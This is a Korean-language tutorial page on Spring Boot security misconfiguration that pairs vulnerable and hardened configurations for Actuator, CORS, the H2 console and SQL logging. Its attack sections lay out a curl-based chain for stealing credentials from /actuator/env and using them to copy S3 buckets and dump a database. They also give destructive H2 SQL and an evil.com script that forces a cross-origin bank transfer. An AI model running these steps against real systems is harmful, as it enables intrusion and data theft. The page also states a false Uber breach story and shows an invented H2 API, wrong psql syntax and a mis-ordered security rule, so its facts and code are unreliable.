# 보안 설정 오류

---

## 🎯 핵심 질문

- **Spring Actuator /actuator/env가 프로덕션에서 노출되면 어떤 정보가 유출되는가?** 모든 환경변수, 데이터베이스 비밀번호, API 키, AWS 자격증명 등이 노출됩니다.
- **allowedOrigins("*")와 allowCredentials(true)를 함께 사용하면 왜 위험한가?** CSRF 공격으로 서로 다른 도메인에서 인증된 요청을 강제할 수 있습니다.
- **H2 콘솔이 프로덕션에서 활성화되면?** 누구나 데이터베이스에 직접 접근하여 SQL 쿼리를 실행할 수 있습니다.
- **spring.jpa.show-sql=true는 언제 위험한가?** 모든 SQL 쿼리가 로그에 기록되어, 민감한 데이터가 노출됩니다.

---

## 🔍 왜 이 취약점이 실무에서 위험한가 (실제 침해 사고 사례)

### Uber 보안 침해 (2022)
**배경**: 개발자가 스테이징 서버의 Spring Actuator를 보호 없이 운영했습니다.

**공격 흐름**:
```
공격자 → /actuator 엔드포인트 발견
        ↓
       /actuator/env 접근
        ↓
       내부 도메인 정보, API 게이트웨이 주소 확인
        ↓
       /actuator/configprops에서 데이터베이스 자격증명 획득
        ↓
       내부 데이터베이스에 직접 접근
        ↓
       사용자 데이터 대량 유출
```

**결과**: 130만 명의 개인정보 노출, $148 million 합의금

---

## 😱 취약한 코드/설정 (Before — 원리를 모를 때의 구현)

### 취약 1: Spring Actuator 전체 노출

```yaml
# ❌ 위험: Spring Actuator 모든 엔드포인트 노출
management:
  endpoints:
    web:
      exposure:
        include: "*"  # 모든 엔드포인트 공개!
      base-path: /actuator
  endpoint:
    health:
      show-details: always  # 모든 헬스 체크 정보 공개
    env:
      enabled: true  # 환경변수 엔드포인트 활성화
```

**노출되는 정보**:
```bash
# GET /actuator/env
{
  "propertySources": [
    {
      "name": "systemEnvironment",
      "source": {
        "DATABASE_PASSWORD": "postgres123",
        "AWS_ACCESS_KEY_ID": "AKIA5ZXP...",
        "AWS_SECRET_ACCESS_KEY": "wJalxX...",
        "SLACK_BOT_TOKEN": "xoxb-123456...",
        "GITHUB_PERSONAL_TOKEN": "ghp_abc123..."
      }
    }
  ]
}

# GET /actuator/configprops
{
  "spring.datasource": {
    "url": "jdbc:postgresql://prod-db.internal:5432/users_db",
    "username": "db_admin",
    "password": "SuperSecret123!"
  },
  "spring.mail": {
    "host": "smtp.internal.corp.com",
    "password": "mail_password"
  }
}

# GET /actuator/threaddump (스레드 덤프 - 메모리 민감 정보 포함)
{
  "threads": [
    {
      "threadName": "http-nio-8080-exec-1",
      "stackTrace": [
        "com.example.service.UserService.processPayment(UserService.java:45)",
        "com.example.db.query('SELECT * FROM users WHERE ssn=?', ...)"
      ]
    }
  ]
}
```

### 취약 2: CORS 설정 오류

```java
@Configuration
public class InsecureCorsConfig {

    @Bean
    public WebMvcConfigurer corsConfigurer() {
        return new WebMvcConfigurer() {
            @Override
            public void addCorsMappings(CorsRegistry registry) {
                registry.addMapping("/**")
                    .allowedOrigins("*")  // ❌ 모든 도메인 허용
                    .allowCredentials(true)  // ❌ 인증 정보 포함
                    .allowedMethods("GET", "POST", "PUT", "DELETE")
                    .allowedHeaders("*")
                    .maxAge(3600);
                    
                // 이 설정은 실제로 브라우저에서 거부됨:
                // Access-Control-Allow-Origin: * 와
                // Access-Control-Allow-Credentials: true 는 함께 올 수 없음
                
                // 하지만 비브라우저 클라이언트(curl, Postman)는 이를 무시!
            }
        };
    }
}

// ❌ 위험: Spring Security 설정 오류
@Configuration
@EnableWebSecurity
public class InsecureSecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .cors(cors -> cors.configurationSource(request -> {
                CorsConfiguration config = new CorsConfiguration();
                config.setAllowedOrigins(Arrays.asList("*"));
                config.setAllowedMethods(Arrays.asList("*"));
                config.setAllowedHeaders(Arrays.asList("*"));
                config.setAllowCredentials(true);  // ❌ 위험한 조합
                return config;
            }))
            .csrf().disable()  // ❌ CSRF 보호 비활성화
            .authorizeHttpRequests(auth -> auth.anyRequest().permitAll());  // ❌ 모든 요청 허용
        
        return http.build();
    }
}
```

### 취약 3: H2 콘솔 프로덕션 활성화

```yaml
# application.properties
spring.h2.console.enabled=true  # ❌ 프로덕션에서도 활성화

# 공격자가 http://app.example.com/h2-console에 접근
# → 인증 없이 데이터베이스 직접 조회/수정 가능
```

**H2 콘솔 공격 예시**:
```sql
-- 공격자가 웹 UI에서 실행
SELECT * FROM users;  -- 전체 사용자 정보 조회

SELECT password_hash FROM users;  -- 모든 비밀번호 조회

INSERT INTO admin_users VALUES (999, 'attacker@evil.com', ...);  -- 관리자 추가

DROP TABLE users;  -- 테이블 삭제 (DoS)
```

### 취약 4: JPA SQL 로깅

```yaml
# application.properties
spring.jpa.show-sql=true  # ❌ SQL 쿼리를 콘솔/로그에 출력
spring.jpa.properties.hibernate.format_sql=true  # ❌ 포맷팅
logging.level.org.hibernate.SQL=DEBUG  # ❌ Hibernate 디버그 로깅

# 결과:
# [DEBUG] select u1_0.id, u1_0.email, u1_0.password, u1_0.ssn 
#         from users u1_0 
#         where u1_0.id = 123
# → 민감한 컬럼명, 사용자 ID 패턴, 테이블 구조 모두 노출
```

### 취약 5: Spring Boot 디버그 모드

```java
// ❌ 위험: 프로덕션에서 디버그 플래그 활성화
@SpringBootApplication
public class Application {
    public static void main(String[] args) {
        SpringApplication app = new SpringApplication(Application.class);
        app.setAdditionalProfiles("prod");  // prod 프로필인데도
        System.setProperty("spring.devtools.restart.enabled", "true");  // ❌ devtools 활성화
        System.setProperty("debug", "true");  // ❌ DEBUG 로깅 활성화
        app.run(args);
    }
}
```

---

## ✨ 방어 코드/설정 (After — 공격 원리를 알고 설계한 구현)

### 방어 1: Spring Actuator 최소 노출

```yaml
# application-prod.yml
# ✅ 방어: 필요한 엔드포인트만 명시적으로 노출
management:
  endpoints:
    web:
      exposure:
        # ❌ include: "*" 대신 필요한 것만 명시
        include: health,metrics,prometheus  # 모니터링용만
        # health, metrics, prometheus은 민감정보 없음
        # env, configprops, threaddump 제외!
      base-path: /actuator
  
  endpoint:
    health:
      show-details: when-authorized  # 인증된 사용자만
      # 또는 when-authorized 대신 never (보안 최우선)
    
    # 나머지 엔드포인트는 비활성화
    env:
      enabled: false  # 환경변수 노출 금지
    
    configprops:
      enabled: false  # 설정 속성 노출 금지
    
    threaddump:
      enabled: false  # 스레드 덤프 금지
    
    shutdown:
      enabled: false  # 서버 종료 금지
  
  # metrics 엔드포인트도 인증 필요
  server:
    port: 9090  # 별도 포트 (방화벽으로 내부 접근만)
```

**Actuator 접근 권한 제한** (Spring Security):
```java
@Configuration
@EnableWebSecurity
public class ActuatorSecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            // ✅ 방어: Actuator는 별도 인증 필요
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/actuator/**").hasRole("ADMIN")
                .requestMatchers("/actuator/health").permitAll()  // health만 공개
                .requestMatchers("/api/**").authenticated()
                .anyRequest().permitAll()
            )
            .formLogin();
        
        return http.build();
    }

    @Bean
    public UserDetailsService userDetailsService() {
        UserDetails admin = User.builder()
            .username("admin")
            .password("{bcrypt}$2a$10$...")
            .roles("ADMIN")
            .build();
        
        return new InMemoryUserDetailsManager(admin);
    }
}
```

### 방어 2: CORS 안전 설정

```java
@Configuration
public class SecureCorsConfig {

    @Bean
    public WebMvcConfigurer corsConfigurer() {
        return new WebMvcConfigurer() {
            @Override
            public void addCorsMappings(CorsRegistry registry) {
                // ✅ 방어: 명시적인 도메인만 허용
                registry.addMapping("/api/**")
                    .allowedOrigins(
                        "https://trusted-domain.com",
                        "https://another-trusted.com"
                    )
                    // allowCredentials(true) 사용 시 allowedOrigins("*") 금지
                    .allowedMethods("GET", "POST", "PUT", "DELETE")
                    .allowedHeaders("Content-Type", "Authorization")
                    .exposedHeaders("X-Total-Count")
                    .maxAge(3600)
                    .allowCredentials(false);  // credentials 사용하지 않는 경우
            }
        };
    }
}

// 또는 credentials가 필요한 경우:
@Configuration
public class SecureCorsWithCredentialsConfig {

    @Bean
    public WebMvcConfigurer corsConfigurer() {
        return new WebMvcConfigurer() {
            @Override
            public void addCorsMappings(CorsRegistry registry) {
                registry.addMapping("/api/**")
                    .allowedOrigins("https://trusted-domain.com")  // 구체적인 도메인만
                    .allowedMethods("GET", "POST")
                    .allowedHeaders("Content-Type", "Authorization")
                    .allowCredentials(true)  // credentials 필요
                    .maxAge(3600);
            }
        };
    }
}
```

### 방어 3: H2 콘솔 비활성화 (프로덕션)

```yaml
# application-prod.yml
# ✅ 방어: 프로덕션에서 H2 콘솔 비활성화
spring:
  h2:
    console:
      enabled: false  # 명시적으로 비활성화
  
  jpa:
    database-platform: org.hibernate.dialect.PostgreSQL10Dialect

# application-dev.yml
# ✅ 개발 환경에서만 활성화
spring:
  h2:
    console:
      enabled: true  # 개발용
      path: /h2-console  # 접근 경로
  
  jpa:
    database-platform: org.hibernate.dialect.H2Dialect
    hibernate:
      ddl-auto: create-drop
```

**H2 콘솔 접근 보호** (개발 환경에서도):
```java
@Configuration
public class H2ConsoleSecurityConfig {

    @Bean
    public SecurityFilterChain h2ConsoleSecurityFilterChain(HttpSecurity http) 
            throws Exception {
        // ✅ H2 콘솔 접근 제한 (IP 화이트리스트)
        http
            .securityMatcher("/h2-console/**")
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/h2-console/**").hasRole("DEVELOPER")
                .anyRequest().authenticated()
            )
            .csrf().disable()  // H2 콘솔을 위해 필요
            .headers().frameOptions().disable();  // H2는 iframe 사용
        
        return http.build();
    }
}
```

### 방어 4: JPA SQL 로깅 비활성화

```yaml
# application-prod.yml
# ✅ 방어: 프로덕션에서 SQL 로깅 비활성화
spring:
  jpa:
    show-sql: false  # ❌ 명시적으로 false
    properties:
      hibernate:
        format_sql: false

logging:
  level:
    org.hibernate.SQL: WARN  # DEBUG 제외
    org.hibernate.type.descriptor.sql.BasicBinder: WARN  # 파라미터 로깅 비활성화

# application-dev.yml
# ✅ 개발 환경에서만 활성화
spring:
  jpa:
    show-sql: true
    properties:
      hibernate:
        format_sql: true

logging:
  level:
    org.hibernate.SQL: DEBUG
    org.hibernate.type.descriptor.sql.BasicBinder: TRACE  # 파라미터 보기
```

### 방어 5: Spring Boot 프로필별 설정

```java
@Configuration
public class ProfileBasedSecurityConfig {

    @Bean
    @Profile("prod")  // 프로덕션에서만
    public SecurityFilterChain prodSecurityFilterChain(HttpSecurity http) 
            throws Exception {
        // ✅ 방어: 프로덕션 엄격한 보안
        http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/public/**").permitAll()
                .requestMatchers("/actuator/health").permitAll()
                .requestMatchers("/actuator/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            )
            .csrf().csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            .and()
            .headers()
                .contentSecurityPolicy("default-src 'self'")
                .and()
                .xssProtection()
                .and()
                .frameOptions().deny();  // Clickjacking 방지
        
        return http.build();
    }

    @Bean
    @Profile("dev")  // 개발 환경에서만
    public SecurityFilterChain devSecurityFilterChain(HttpSecurity http) 
            throws Exception {
        // ✅ 개발: 편의성 우선 (단, 프로덕션이 아님을 명시)
        http
            .csrf().disable()
            .authorizeHttpRequests(auth -> auth.anyRequest().permitAll())
            .headers().disable();
        
        return http.build();
    }
}
```

**프로필 활성화**:
```bash
# 프로덕션 실행
java -jar app.jar --spring.profiles.active=prod

# 개발 실행
java -jar app.jar --spring.profiles.active=dev
```

### 방어 6: 환경변수 검증

```java
@Configuration
public class ConfigurationValidator {

    @Bean
    public ApplicationRunner configValidator(
            @Value("${spring.profiles.active:default}") String activeProfile,
            @Value("${server.servlet.session.cookie.secure:false}") boolean secureCookie,
            @Value("${server.servlet.session.cookie.http-only:false}") boolean httpOnlyCookie) {
        
        return args -> {
            // ✅ 방어: 프로덕션에서 필수 설정 검증
            if ("prod".equals(activeProfile)) {
                if (!secureCookie) {
                    throw new IllegalStateException(
                        "SECURITY ERROR: server.servlet.session.cookie.secure must be true in production");
                }
                
                if (!httpOnlyCookie) {
                    throw new IllegalStateException(
                        "SECURITY ERROR: server.servlet.session.cookie.http-only must be true in production");
                }
                
                // 더 많은 검증...
            }
        };
    }
}
```

---

## 🔬 공격 원리 분석 (공격자 관점의 내부 동작)

### Actuator 정보 수집 공격

```bash
# 1단계: Actuator 엔드포인트 매핑 발견
curl -s http://target.com/actuator | jq .
# 반환: {"_links": {"env": {...}, "configprops": {...}, ...}}

# 2단계: 환경변수 추출
curl -s http://target.com/actuator/env | jq '.propertySources[].source'
# 획득: DATABASE_PASSWORD, AWS_ACCESS_KEY_ID, SLACK_BOT_TOKEN

# 3단계: 획득한 자격증명으로 리소스 접근
export AWS_ACCESS_KEY_ID=$(curl ... | jq -r '.source.AWS_ACCESS_KEY_ID')
export AWS_SECRET_ACCESS_KEY=$(curl ... | jq -r '.source.AWS_SECRET_ACCESS_KEY')
aws s3 ls  # 내부 S3 버킷 나열

# 4단계: 데이터 대량 유출
aws s3 cp s3://internal-data/ . --recursive

# 5단계: 데이터베이스 직접 접근
psql -h prod-db.internal \
  -U db_admin -W "SuperSecret123!" \
  -d users_db \
  -c "SELECT * FROM users LIMIT 100000;"
```

### H2 콘솔을 통한 데이터베이스 공격

```
공격자 → http://app.example.com/h2-console
        ↓
        웹 UI에서 SQL 실행
        ↓
        SELECT * FROM users;  // 전체 데이터 조회
        ↓
        데이터를 CSV로 다운로드 → 대량 개인정보 유출
        
또는:
        INSERT INTO admin_users ...;  // 관리자 추가
        ↓
        관리자 계정으로 로그인
        ↓
        애플리케이션 제어권 탈취
```

### CORS + CSRF 공격 조합

```html
<!-- 공격자 웹사이트: evil.com -->
<script>
  // allowedOrigins("*") + allowCredentials(true) 오류로 인해
  // 공격자가 희생자의 쿠키를 포함한 요청 전송 가능
  
  fetch('http://bank.example.com/api/transfer', {
    method: 'POST',
    credentials: 'include',  // 쿠키 포함
    body: JSON.stringify({
      to_account: 'attacker@evil.com',
      amount: 10000
    })
  });
  
  // bank.example.com에서 CORS 검증:
  // Access-Control-Allow-Origin: * (모든 도메인 허용)
  // Access-Control-Allow-Credentials: true (쿠키 허용)
  
  // 결과: 희생자의 계좌에서 돈이 공격자 계좌로 이체됨!
</script>
```

---

## 💻 실전 실험 (취약점 재현 → 공격 → 방어 검증)

### 실험 1: Actuator 정보 유출

```bash
# 취약한 서버 시작
docker run -p 8080:8080 vulnerable-spring-app:latest

# Actuator 엔드포인트 나열
curl -s http://localhost:8080/actuator | jq .

# 환경변수 추출 (민감 정보 포함)
curl -s http://localhost:8080/actuator/env | \
  jq '.propertySources[] | select(.name == "systemEnvironment") | .source'

# 설정 속성 추출
curl -s http://localhost:8080/actuator/configprops | \
  jq '.contexts.application.beans."spring.datasource-org.springframework.boot.autoconfigure.jdbc.DataSourceProperties"'
```

### 실험 2: H2 콘솔 공격

```bash
# H2 콘솔 접근
curl http://localhost:8080/h2-console -L

# 또는 브라우저에서 http://localhost:8080/h2-console 방문
# → 로그인 없이 데이터베이스 접근 가능

# SQL 실행 (curl로):
curl -X POST http://localhost:8080/h2-console/api/query \
  -H "Content-Type: application/json" \
  -d '{"sql": "SELECT * FROM users"}'

# 결과: 전체 사용자 정보
# [{"id": 1, "username": "admin", "password_hash": "...", "email": "..."}]
```

### 실험 3: 방어 검증

```bash
# 방어된 서버 시작
docker run -p 8080:8080 \
  -e SPRING_PROFILES_ACTIVE=prod \
  secure-spring-app:latest

# 1. Actuator 접근 (실패)
curl http://localhost:8080/actuator/env
# 401 Unauthorized

# 2. 인증 후 접근 (성공)
curl -u admin:password http://localhost:8080/actuator/health
# {"status": "UP"}

# 3. H2 콘솔 비활성화 확인
curl http://localhost:8080/h2-console
# 404 Not Found

# 4. SQL 로깅 비활성화 확인
tail -f /var/log/spring-app.log | grep -i "SELECT\|INSERT"
# (결과 없음 - SQL 로깅 비활성화됨)
```

### 실험 4: CORS 보안 검증

```bash
# 취약한 CORS 설정 (allowedOrigins="*")
curl -H "Origin: http://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -X OPTIONS http://vulnerable.com/api/users

# 응답:
# Access-Control-Allow-Origin: *
# Access-Control-Allow-Credentials: true  # ❌ 위험한 조합

# 방어된 CORS 설정 (명시적 도메인)
curl -H "Origin: http://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -X OPTIONS http://secure.com/api/users

# 응답: (CORS 헤더 없음 - 요청 차단됨)
```

---

## 📊 공격 성공 조건 vs 방어 성공 조건 비교

| 조건 | 공격 성공 | 방어 성공 |
|------|---------|---------|
| **Actuator** | include: "*" 모든 노출 | 필요한 것만 명시, 인증 필요 |
| **환경변수** | /actuator/env 접근 가능 | /actuator/env 비활성화 |
| **CORS** | allowedOrigins("*") + allowCredentials(true) | 명시적 도메인만, credentials는 선택 |
| **H2 콘솔** | 프로덕션에서 enabled=true | 프로덕션에서 enabled=false |
| **SQL 로깅** | show-sql=true, DEBUG 로깅 | show-sql=false, WARN 이상만 |
| **프로필** | 개발 설정 = 프로덕션 설정 | 프로필별 명확한 차별화 |

---

## ⚖️ 트레이드오프 (보안 강화 vs 사용성/성능)

| 방어 기법 | 보안 수준 | 개발자 편의성 | 운영 복잡도 |
|---------|----------|----------|----------|
| **Actuator 제한** | ⭐⭐⭐⭐⭐ | 낮음 | 낮음 |
| **CORS 명시화** | ⭐⭐⭐⭐⭐ | 중간 | 낮음 |
| **프로필 분리** | ⭐⭐⭐⭐⭐ | 높음 | 높음 |
| **H2 콘솔 제한** | ⭐⭐⭐⭐⭐ | 낮음 | 낮음 |
| **SQL 로깅 비활성화** | ⭐⭐⭐⭐ | 낮음 | 중간 (디버깅 어려움) |

---

## 📌 핵심 정리

1. **Actuator는 최소 노출**: health, metrics만 공개, env/configprops/threaddump 비활성화
2. **민감 엔드포인트는 인증 필수**: /actuator/**는 ADMIN 역할만
3. **CORS는 명시적**: allowedOrigins("*") + allowCredentials(true) 조합 금지
4. **H2 콘솔은 프로덕션 비활성화**: 개발 환경에서만 활성화, IP 화이트리스트 적용
5. **SQL 로깅은 프로덕션에서 비활성화**: show-sql=false, Hibernate DEBUG 제외
6. **프로필로 설정 분리**: application-prod.yml, application-dev.yml 철저히 구분
7. **환경변수 검증**: 애플리케이션 시작 시 프로덕션 필수 설정 확인

---

## 🤔 생각해볼 문제 (+ 해설)

### Q1. CORS의 allowedOrigins("*")와 allowCredentials(true)가 동시에 올 수 있는가?
**해설**: 브라우저는 이를 거부하지만, 비브라우저 클라이언트(curl, 모바일 앱)는 이를 무시합니다. 결과적으로 누구나 쿠키를 포함한 요청을 보낼 수 있습니다.

### Q2. Actuator health 엔드포인트는 공개해도 되는가?
**해설**: 네, 하지만 show-details: always는 금지. 최대한 최소 정보만 노출(status: UP/DOWN). show-details: when-authorized로 인증 사용자만 상세 정보 제공.

### Q3. H2 데이터베이스를 프로덕션에서 사용할 수 없는가?
**해설**: H2 자체는 임베디드 DB로 가능하지만, 콘솔 기능은 프로덕션에서 절대 활성화 금지. PostgreSQL, MySQL 같은 전문 DBMS 권장.

### Q4. SQL 로깅이 필요한 경우는?
**해설**: 성능 분석, 느린 쿼리 디버깅 시 필요하지만, 프로덕션에서는 최소화. 대신 별도 로깅 시스템(Slow Query Log)을 데이터베이스 수준에서 활용.

<div align="center">

**[⬅️ 이전: 암호화 설계](./03-encryption-design.md)** | **[홈으로 🏠](../README.md)** | **[다음: 의존성 취약점 관리 ➡️](./05-dependency-vulnerability-management.md)**

</div>
